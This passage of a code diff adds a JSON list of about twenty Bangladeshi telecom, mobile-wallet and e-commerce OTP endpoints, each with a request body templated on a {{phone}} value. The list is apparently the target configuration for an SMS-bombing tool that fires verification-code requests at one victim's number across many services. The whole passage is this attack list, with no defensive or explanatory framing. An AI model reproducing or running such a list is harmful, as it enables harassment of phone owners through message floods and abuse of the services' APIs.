+      "url": "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp",
+      "method": "post",
+      "body": "{\"deviceId\":\"prodevice\",\"operator\":\"Gp\",\"walletNumber\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Robi Internet",
+      "url": "https://webapi.robi.com.bd/v1/send-otp",
+      "method": "post",
+      "body": "{\"phone_number\":\"{{phone}}\",\"type\":\"internet_pack\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Dmoney",
+      "url": "https://api.dmoney.com.bd/api/v1/otp/send?msisdn={{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {}
+    },
+    {
+      "name": "Nagad",
+      "url": "https://api.nagad.com.bd/otp/send",
+      "method": "post",
+      "body": "{\"mobileNumber\":\"{{phone}}\",\"service\":\"login\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Surecash",
+      "url": "https://api.surecash.com.bd/v2/otp/generate",
+      "method": "post",
+      "body": "{\"msisdn\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Rocket",
+      "url": "https://api.rocket.com.bd/merchant/otp",
+      "method": "post",
+      "body": "{\"account\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Bkash",
+      "url": "https://api.bkash.com.bd/otp/request",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\",\"type\":\"registration\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Foodpanda",
+      "url": "https://api.foodpanda.com.bd/v1/auth/otp",
+      "method": "post",
+      "body": "{\"phone\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Pathao",
+      "url": "https://api.pathao.com/v2/auth/otp",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Daraz",
+      "url": "https://api.daraz.com.bd/auth/otp",
+      "method": "post",
+      "body": "{\"mobile\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Priyoshop",
+      "url": "https://api.priyoshop.com/v1/otp/send",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Ajkerdeal",
+      "url": "https://ajkerdeal.com/api/v1/otp?phone={{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {}
+    },
+    {
+      "name": "Evaly",
+      "url": "https://api.evaly.com.bd/auth/otp",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Chaldal",
+      "url": "https://api.chaldal.com/v1/auth/otp",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Shurjopay",
+      "url": "https://api.shurjopay.com.bd/otp/send",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "SSL Wireless",
+      "url": "https://sslwireless.com/api/otp",
+      "method": "post",
+      "body": "{\"msisdn\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Robi Voice",
+      "url": "https://webapi.robi.com.bd/v1/send-otp",
+      "method": "post",
+      "body": "{\"phone_number\":\"{{phone}}\",\"type\":\"voice\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "MyGP",
+      "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {}
+    },
+    {
+      "name": "Banglalink Selfcare",
+      "url": "https://selfcare.banglalink.net/api/v1/otp",
+      "method": "post",
+      "body": "{\"msisdn\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Teletalk",
+      "url": "https://teletalk.com.bd/api/otp/send",
+      "method": "post",
+      "body": "{\"number\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    }
+  ]
+}
